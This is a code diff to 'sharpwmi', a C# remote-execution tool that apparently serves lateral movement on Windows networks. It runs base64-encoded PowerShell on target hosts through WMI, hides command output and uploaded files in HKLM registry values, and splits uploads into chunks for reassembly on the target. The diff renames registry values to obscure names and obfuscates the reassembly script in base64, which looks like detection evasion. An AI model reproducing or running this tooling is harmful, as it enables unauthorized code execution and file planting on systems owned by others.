@@ -3,6 +3,7 @@ using System.Text;
 using System.Threading;
 using System.IO;
 using System.Management;
+using System.Collections.Generic;
 
 namespace sharpwmi
 {
@@ -139,7 +140,7 @@ namespace sharpwmi
                 {
                     string powershell_command = "powershell -enc " + Base64Encode(args[4]);
 
-                    string code = "$a=(" + powershell_command + ");$b=[Convert]::ToBase64String([System.Text.UnicodeEncoding]::Unicode.GetBytes($a));$reg = Get-WmiObject -List -Namespace root\\default | Where-Object {$_.Name -eq \"StdRegProv\"};$reg.SetStringValue(2147483650,\"\",\"txt\",$b)";
+                    string code = "$a=(" + powershell_command + ");$b=[Convert]::ToBase64String([System.Text.UnicodeEncoding]::Unicode.GetBytes($a));$reg = Get-WmiObject -List -Namespace root\\default | Where-Object {$_.Name -eq \"StdRegProv\"};$reg.SetStringValue(2147483650,\"\",\"ft_rcx\",$b)";
 
 
                     ExecCmd("powershell -enc " + Base64Encode(code));
@@ -152,36 +153,63 @@ namespace sharpwmi
                     ManagementBaseObject inParams = registry.GetMethodParameters("GetStringValue");
 
                     inParams["sSubKeyName"] = "";
-                    inParams["sValueName"] = "txt";
+                    inParams["sValueName"] = "ft_rcx";
                     ManagementBaseObject outParams = registry.InvokeMethod("GetStringValue", inParams, null);
                     // (String)outParams["sValue"];
 
-                    Console.WriteLine("[+]output -> \n\n" + Base64Decode(outParams["sValue"].ToString()));
+                    Console.WriteLine("[+]output -> \n" + Base64Decode(outParams["sValue"].ToString()));
                 }
                 else if (args[3] == "upload")
                 {
 
-
-
                     //写注册表
                     byte[] str = File.ReadAllBytes(args[4]);
-
+                    List<byte[]> pChunks = splitChunks(str);
 
                     ManagementClass registry = new ManagementClass(this.scope, new ManagementPath("StdRegProv"), null);
+
+                    //写segment数量
                     ManagementBaseObject inParams = registry.GetMethodParameters("SetStringValue");
                     inParams["hDefKey"] = 2147483650; //HKEY_LOCAL_MACHINE;
                     inParams["sSubKeyName"] = @"";
-                    inParams["sValueName"] = "upload";
-
-                    inParams["sValue"] = Convert.ToBase64String(str);
+                    inParams["sValueName"] = "ft_segs";
+                    inParams["sValue"] = pChunks.Count;
                     ManagementBaseObject outParams = registry.InvokeMethod("SetStringValue", inParams, null);
 
+                    //写文件大小
+                    ManagementBaseObject inParams2 = registry.GetMethodParameters("SetStringValue");
+                    inParams["hDefKey"] = 2147483650; //HKEY_LOCAL_MACHINE;
+                    inParams["sSubKeyName"] = @"";
+                    inParams["sValueName"] = "ft_size";
+                    inParams["sValue"] = str.Length;
+                    ManagementBaseObject outParams2 = registry.InvokeMethod("SetStringValue", inParams, null);
+
+                    //写segment内容
+                    int curChunk = 0;
+                    foreach (byte[] curData in pChunks)
+                    {
+                        ManagementBaseObject _inParams3 = registry.GetMethodParameters("SetStringValue");
+                        _inParams3["hDefKey"] = 2147483650; //HKEY_LOCAL_MACHINE;
+                        _inParams3["sSubKeyName"] = @"";
+                        _inParams3["sValueName"] = "ft_p" + curChunk.ToString();
+                        _inParams3["sValue"] = Convert.ToBase64String(curData);
+                        ManagementBaseObject _outParams3 = registry.InvokeMethod("SetStringValue", _inParams3, null);
+                        curChunk++;
+                    }
 
 
                     //通过注册表还原文件
-                    string pscode = string.Format("$wmi = [wmiclass]\"Root\\default:stdRegProv\";$data=($wmi.GetStringValue(2147483650,\"\",\"upload\")).sValue;$byteArray = [Convert]::FromBase64String($data);[io.file]::WriteAllBytes(\"{0:s}\",$byteArray);;", args[5]);
+                    //string pscode = string.Format("$wmi = [wmiclass]\"Root\\default:stdRegProv\";$data=($wmi.GetStringValue(2147483650,\"\",\"upload\")).sValue;$byteArray = [Convert]::FromBase64String($data);[io.file]::WriteAllBytes(\"{0:s}\",$byteArray);;", args[5]);
+                    //string pscode = string.Format("$wmi=[wmiclass]\"Root\\default:stdRegProv\";$ftsegs=($wmi.GetStringValue(2147483650,\"\",\"ft_segs\")).sValue;$ftsize=($wmi.GetStringValue(2147483650,\"\",\"ft_size\")).sValue;$fbytes=New-Object Byte[] 0;for($sid=0;$sid-lt$ftsegs;$sid++){$sdata=($wmi.GetStringValue(2147483650,\"\",\"ft_p$sid\")).sValue;$fbytes+=[Convert]::FromBase64String($sdata);}[io.file]::WriteAllBytes(\"{0:s}\",$fbytes);", args[5]);
+                    //TODO:文件合成完毕后删除相关注册表
+                    string pscode = Encoding.UTF8.GetString(Convert.FromBase64String("JHdtaT1bd21pY2xhc3NdIlJvb3RcZGVmYXVsdDpzdGRSZWdQcm92IjskZnRzZWdzPSgkd21pLkdldF" +
+                        "N0cmluZ1ZhbHVlKDIxNDc0ODM2NTAsIiIsImZ0X3NlZ3MiKSkuc1ZhbHVlOyRmdHNpemU9KCR3bWkuR2V0U3RyaW5nVmFsdWUoMjE0NzQ4MzY1MCwiIiwiZnRfc2l6ZSIpKS5zVmFsd" +
+                        "WU7JGZieXRlcz1OZXctT2JqZWN0IEJ5dGVbXSAwO2Zvcigkc2lkPTA7JHNpZC1sdCRmdHNlZ3M7JHNpZCsrKXskc2RhdGE9KCR3bWkuR2V0U3RyaW5nVmFsdWUoMjE0NzQ4MzY1MCwi" +
+                        "IiwiZnRfcCRzaWQiKSkuc1ZhbHVlOyRmYnl0ZXMrPVtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkc2RhdGEpO31baW8uZmlsZV06OldyaXRlQWxsQnl0ZXMoIg==")) 
+                            + args[5] + Encoding.UTF8.GetString(Convert.FromBase64String("IiwkZmJ5dGVzKTs="));
                     string powershell_command = "powershell -enc " + Base64Encode(pscode);
 
+                    //Console.WriteLine(pscode);
                     Thread.Sleep(delay);
                     ExecCmd(powershell_command);
                     Console.WriteLine("[+]Upload file done!");
@@ -198,6 +226,32 @@ namespace sharpwmi
             sharpwmi myWMICore = new sharpwmi();
             myWMICore.run(args);
 
+        }
+
+        static List<byte[]> splitChunks(byte[] input)
+        {
+            List<byte[]> pChunks = new List<byte[]>();
+            int curSize = 0;
+            int setSize = 262144;
+            byte[] curChunk = new byte[setSize];
+            for(int ch = 0; ch < input.Length; ch++)
+            {
+                if (curSize >= setSize)
+                {
+                    pChunks.Add(curChunk);
+                    curSize = 0;
+                    curChunk = new byte[setSize];
+                }
+                curChunk[curSize] = input[ch];
+                curSize += 1;
+
+            }
+
+            byte[] lastChunk = new byte[curSize];
+            Array.Copy(curChunk, lastChunk, curSize);
+            pChunks.Add(lastChunk);
+
+            return pChunks;
         }
     }
 }
